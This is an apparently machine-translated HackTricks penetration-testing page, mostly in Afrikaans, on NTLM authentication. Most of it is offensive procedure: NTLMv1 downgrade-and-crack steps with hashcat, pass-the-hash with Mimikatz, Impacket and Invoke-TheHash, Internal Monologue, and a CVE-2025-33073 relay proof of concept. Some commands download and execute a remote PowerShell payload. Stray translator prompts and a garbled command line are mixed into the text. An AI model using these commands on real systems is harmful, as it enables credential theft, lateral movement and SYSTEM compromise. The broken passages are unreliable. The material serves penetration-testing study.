# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Basiese Inligting

In omgewings waar **Windows XP en Server 2003** in werking is, word LM (Lan Manager)-hashes gebruik, hoewel dit algemeen erken word dat hierdie hashes maklik gekompromitteer kan word. 'n Spesifieke LM-hash, `AAD3B435B51404EEAAD3B435B51404EE`, dui op 'n scenario waar LM nie gebruik word nie en verteenwoordig die hash vir 'n leë string.

By verstek is die **Kerberos**-authentication protocol die primêre metode wat gebruik word. NTLM (NT LAN Manager) tree onder spesifieke omstandighede in werking: wanneer Active Directory ontbreek, die domain nie bestaan nie, Kerberos weens verkeerde configuration nie funksioneer nie, of wanneer connections met 'n IP address eerder as 'n geldige hostname gemaak word.

Die teenwoordigheid van die **"NTLMSSP"**-header in network packets dui op 'n NTLM-authentication process.

Support vir die authentication protocols - LM, NTLMv1 en NTLMv2 - word verskaf deur 'n spesifieke DLL wat by `%windir%\Windows\System32\msv1\_0.dll` geleë is.

**Sleutelpunte**:

- LM-hashes is kwesbaar en 'n leë LM-hash (`AAD3B435B51404EEAAD3B435B51404EE`) dui aan dat dit nie gebruik word nie.
- Kerberos is die verstek-authentication method, met NTLM wat slegs onder sekere omstandighede gebruik word.
- NTLM-authentication packets kan deur die "NTLMSSP"-header geïdentifiseer word.
- Die LM-, NTLMv1- en NTLMv2-protocols word deur die system file `msv1\_0.dll` ondersteun.

## LM, NTLMv1 and NTLMv2

Jy kan nagaan en configure watter protocol gebruik sal word:

### GUI

Voer _secpol.msc_ uit -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Daar is 6 levels (van 0 tot 5).

![LM, NTLMv1 and NTLMv2 - GUI: Voer secpol.msc uit - Local policies - Security Options - Network Security: LAN Manager authentication level. Daar is 6 levels (van 0 tot 5)](<../../images/image (919).png>)

### Registry

Dit sal level 5 stel:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Moontlike waardes:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basiese NTLM Domain authentication Scheme

1. Die **user** voer sy **credentials** in
2. Die kliëntmasjien **stuur 'n authentication request** wat die **domain name** en die **username** bevat
3. Die **server** stuur die **challenge**
4. Die **client** enkripteer die **challenge** deur die hash van die password as sleutel te gebruik en stuur dit as response
5. Die **server stuur** die **domain name, die username, die challenge en die response** na die **Domain controller**. Indien daar **nie 'n Active Directory gekonfigureer is nie**, of die domain name die naam van die server is, word die credentials **plaaslik nagegaan**.
6. Die **domain controller kontroleer of alles korrek is** en stuur die inligting na die server

Die **server** en die **Domain Controller** kan 'n **Secure Channel** via die **Netlogon**-server skep, omdat die Domain Controller die password van die server ken (dit is binne die **NTDS.DIT**-db).

### Plaaslike NTLM authentication Scheme

Die authentication is soos die een wat **hierbo genoem is, maar** die **server** ken die **hash van die user** wat binne die **SAM**-lêer probeer authenticate. Dus, in plaas daarvan om die Domain Controller te vra, sal die **server self kontroleer** of die user kan authenticate.

### NTLMv1 Challenge

Die **challenge-lengte is 8 bytes** en die **response** is 24 bytes lank.

Die **NT hash (16bytes)** word in **3 dele van 7bytes elk** verdeel (7B + 7B + (2B+0x00\*5)): die **laaste deel word met nulle gevul**. Dan word die **challenge** afsonderlik met elke deel **gecipher** en die **resulterende** gecipherde bytes word **saamgevoeg**. Totaal: 8B + 8B + 8B = 24Bytes.

**Probleme**:

- Gebrek aan **randomness**
- Die 3 dele kan **afsonderlik aangeval word** om die NT hash te vind
- **DES is crackable**
- Die 3de sleutel bestaan altyd uit **5 nulle**.
- Gegewe dieselfde **challenge**, sal die **response** dieselfde wees. Jy kan dus die string "**1122334455667788**" as 'n **challenge** aan die slagoffer gee en die response met **precomputed rainbow tables** aanval.

### NTLMv1 attack

Unconstrained delegation kom minder algemeen in moderne omgewings voor, maar 'n bereikbare **Print Spooler service** kan steeds misbruik word om authentication na so 'n host af te dwing.

Jy kan sekere credentials/sessies wat jy reeds op die AD het, misbruik om **die printer te vra om te authenticate** teenoor 'n **host onder jou beheer**. Dan kan jy, deur `metasploit auxiliary/server/capture/smb` of `responder` te gebruik, die **authentication challenge op 1122334455667788 stel**, die authentication-poging vaslê, en indien dit met **NTLMv1** gedoen is, sal jy dit kan **crack**.\
Indien jy `responder` gebruik, kan jy probeer om die **flag `--lm` te gebruik** om die **authentication** te probeer **downgrade**.\
_Let daarop dat die authentication vir hierdie tegniek met NTLMv1 uitgevoer moet word (NTLMv2 is nie geldig nie)._

Onthou dat die printer die computer account tydens die authentication sal gebruik, en computer accounts gebruik **lang en random passwords** wat jy **waarskynlik nie sal kan crack nie** deur algemene **dictionaries** te gebruik. Maar die **NTLMv1** authentication **gebruik DES** ([meer inligting hier](#ntlmv1-challenge)), dus sal jy dit kan crack deur sekere dienste te gebruik wat spesifiek aan DES-cracking toegewy is (jy kan byvoorbeeld [https://crack.sh/](https://crack.sh) of [https://ntlmv1.com/](https://ntlmv1.com) gebruik).

### NTLMv1 attack with hashcat

NTLMv1 kan ook aangeval word met [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), wat vasgelegde NTLMv1-boodskappe omskakel na formate wat geskik is vir Hashcat.<sup>[[1]](#references)</sup>

Die opdrag
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
sal die onderstaande uitvoer:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to include in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Voer hashcat uit (verspreide uitvoering is die beste deur ’n hulpmiddel soos hashtopolis), aangesien dit anders etlike dae sal neem.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
In hierdie geval weet ons die wagwoord hiervoor is password, dus gaan ons vir demonstrasiedoeleindes kul:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Ons moet nou die hashcat-utilities gebruik om die gekraakte des-sleutels na dele van die NTLM-hash om te skakel:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Verskaf asseblief die laaste deel van die teks wat vertaal moet word.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the English text to translate and combine.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Die challenge-lengte is 8 grepe** en **2 response word gestuur**: Een is **24 grepe** lank en die lengte van die **ander** is **veranderlik**.

**Die eerste response** word geskep deur die **string** wat deur die **client en die domain** saamgestel word, met behulp van **HMAC_MD5** te cipher en die **hash MD4** van die **NT hash** as **key** te gebruik. Daarna sal die **resultaat** as **key** gebruik word om die **challenge** met behulp van **HMAC_MD5** te cipher. 'n **Client challenge van 8 grepe** sal hierby gevoeg word. Totaal: 24 B.

**Die tweede response** word geskep deur **verskeie waardes** te gebruik ('n nuwe client challenge, 'n **timestamp** om **replay attacks** te voorkom...)

As jy 'n **PCAP met 'n suksesvolle authentication exchange** het, onttrek die domain, username, server challenge en NTLMv2 response, formateer die capture vir Hashcat, en gebruik mode `5600` om password recovery te probeer. Die geargiveerde praktiese walkthrough behou die prosedure vir die onttrekking van packet fields, terwyl Hashcat se voorbeelde die huidige aanvaarde formaat definieer.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Sodra jy die hash van die slagoffer het**, kan jy dit gebruik om dit te **impersonate**.\
Jy moet 'n **tool** gebruik wat die **NTLM authentication met behulp van** daardie **hash uitvoer**, **of** jy kan 'n nuwe **sessionlogon** skep en daardie **hash** binne **LSASS** **inject**, sodat wanneer enige **NTLM authentication uitgevoer word**, daardie **hash gebruik sal word.** Die laaste opsie is wat mimikatz doen.

**Onthou asseblief dat jy ook Pass-the-Hash-aanvalle met Computer accounts kan uitvoer.**

### **Mimikatz**

**Moet as administrator uitgevoer word**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Dit begin ’n proses onder die huidige plaaslike gebruiker, terwyl LSASS die verskafde credentials met sy uitgaande network logon assosieer. Jy kan dan toegang tot network resources as die verskafde gebruiker verkry, soortgelyk aan `runas /netonly`, sonder om die plaintext password te ken.

### Pass-the-Hash vanuit Linux

Jy kan code execution op Windows-masjiene verkry deur Pass-the-Hash vanuit Linux te gebruik.\
[**Sien praktiese Pass-the-Hash execution-voorbeelde.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket Windows compiled tools

Jy kan [impacket binaries vir Windows hier aflaai](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (In hierdie geval moet jy ’n command spesifiseer; cmd.exe en powershell.exe is nie geldig om ’n interactive shell te verkry nie)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Daar is nog verskeie Impacket binaries...

### Invoke-TheHash

Jy kan die powershell-scripts hier kry: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Hierdie funksie kombineer die voorafgaande modusse. Jy kan **verskeie hosts** deurgee, uitgesoekte teikens uitsluit, en _SMBExec, WMIExec, SMBClient,_ of _SMBEnum_ kies. As jy **SMBExec** of **WMIExec** sonder ’n _**Command**_-parameter kies, kontroleer dit slegs of jy voldoende toestemmings het.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Moet as administrateur uitgevoer word**

Hierdie tool doen dieselfde ding as mimikatz (wysig LSASS-geheue).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Handmatige Windows remote execution met gebruikersnaam en wagwoord


{{#ref}}
../lateral-movement/
{{#endref}}

## Geloofsbriewe uit 'n Windows Host onttrek

Vir meer inligting, sien [**Stealing Windows Credentials**](../stealing-credentials/README.md).

## Internal Monologue-aanval

Die Internal Monologue Attack is 'n stealthy credential extraction-tegniek waarmee 'n aanvaller NTLM-hashes vanaf 'n slagoffer se masjien kan bekom **sonder om direk met die LSASS-proses te kommunikeer**. Anders as Mimikatz, wat hashes direk uit die geheue lees en gereeld deur endpoint security-oplossings of Credential Guard geblokkeer word, benut hierdie aanval **plaaslike oproepe na die NTLM-authentication package (MSV1_0) via die Security Support Provider Interface (SSPI)**. Die aanvaller **verlaag eers NTLM-instellings** (bv. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) om te verseker dat NetNTLMv1 toegelaat word. Daarna verpersoonlik hulle bestaande user tokens wat van lopende prosesse verkry is en aktiveer hulle plaaslik NTLM-authentication om NetNTLMv1-responses met behulp van 'n bekende challenge te genereer.<sup>[[4]](#references)</sup>

Nadat hierdie NetNTLMv1-responses vasgelê is, kan die aanvaller die oorspronklike NTLM-hashes vinnig herwin deur **voorafberekende rainbow tables** te gebruik, wat verdere Pass-the-Hash-aanvalle vir lateral movement moontlik maak. Belangrik is dat die Internal Monologue Attack stealthy bly omdat dit nie network traffic genereer, code injecteer of direkte memory dumps aktiveer nie, wat dit moeiliker maak vir defenders om op te spoor in vergelyking met tradisionele metodes soos Mimikatz.

As NetNTLMv1 nie aanvaar word nie—as gevolg van afgedwonge security policies—kan die aanvaller dalk nie 'n NetNTLMv1-response bekom nie.

Om hierdie geval te hanteer, is die Internal Monologue tool opgedateer: Dit verkry dinamies 'n server token deur `AcceptSecurityContext()` te gebruik om steeds **NetNTLMv2-responses vas te lê** as NetNTLMv1 misluk. Alhoewel NetNTLMv2 baie moeiliker is om te crack, bied dit steeds 'n moontlikheid vir relay attacks of offline brute-force in beperkte gevalle.

Die PoC kan gevind word by **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay en Responder

**Lees hier 'n meer gedetailleerde gids oor hoe om hierdie attacks uit te voer:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parse NTLM-challenges uit 'n network capture

**Jy kan** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **gebruik**

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows bevat verskeie mitigations wat probeer om *reflection*-aanvalle te voorkom waar 'n NTLM- (of Kerberos-)authentication wat van 'n host afkomstig is, terug na dieselfde host gerelay word om SYSTEM privileges te verkry.

Microsoft het die meeste publieke chains verbreek met MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) en latere patches. **CVE-2025-33073** toon egter dat die protections steeds omseil kan word deur misbruik te maak van hoe die **SMB client Service Principal Names (SPNs) truncateer** wat *marshalled* (serialized) target-info bevat.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR van die bug
1. 'n Aanvaller registreer 'n **DNS A-record** waarvan die label 'n marshalled SPN enkodeer – bv.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Die slagoffer word gedwing om by daardie hostname te authenticate (PetitPotam, DFSCoerce, ens.).
3. Wanneer die SMB client die target string `cifs/srv11UWhRCAAAAA…` aan `lsasrv!LsapCheckMarshalledTargetInfo` deurgee, **verwyder** die oproep na `CredUnmarshalTargetInfo` die serialized blob, wat **`cifs/srv1`** agterlaat.
4. `msv1_0!SspIsTargetLocalhost` (of die Kerberos-ekwivalent) beskou nou die target as *localhost* omdat die kort host-gedeelte met die rekenaarnaam (`SRV1`) ooreenstem.
5. Gevolglik stel die server `NTLMSSP_NEGOTIATE_LOCAL_CALL` en injecteer dit **LSASS se SYSTEM access-token** in die context (vir Kerberos word 'n SYSTEM-gemerkte subsession key geskep).
6. Deur daardie authentication met `ntlmrelayx.py` **of** `krbrelayx.py` te relay, verkry jy volledige SYSTEM-regte op dieselfde host.<sup>[[5]](#references)</sup>

### Vinnige PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigasies
* KB patch for **CVE-2025-33073** voeg ’n kontrole in `mrxsmb.sys::SmbCeCreateSrvCall` by wat enige SMB-verbinding blokkeer waarvan die teiken gemarshalled info bevat (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Dwing **SMB signing** af om reflection te voorkom, selfs op ongepatchte hosts.
* Monitor DNS-rekords wat soos `*<base64>...*` lyk en blokkeer coercion-vektore (PetitPotam, DFSCoerce, AuthIP...).

### Opsporingsidees
* Netwerk-captures met `NTLMSSP_NEGOTIATE_LOCAL_CALL` waar client IP ≠ server IP.
* Kerberos AP-REQ wat ’n subsessie-sleutel bevat en ’n client principal wat gelyk is aan die hostname.
* Windows Event 4624/4648 SYSTEM-logons wat onmiddellik gevolg word deur afgeleë SMB-skrywe vanaf dieselfde host.<sup>[[5]](#references)</sup>

Vir die **Maart 2026** local reflection-variant wat **SMB arbitrary ports** en **TCP connection reuse** misbruik om `NT AUTHORITY\SYSTEM` te bereik, sien:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat example hashes – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Cracking an NTLMv2 Hash – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
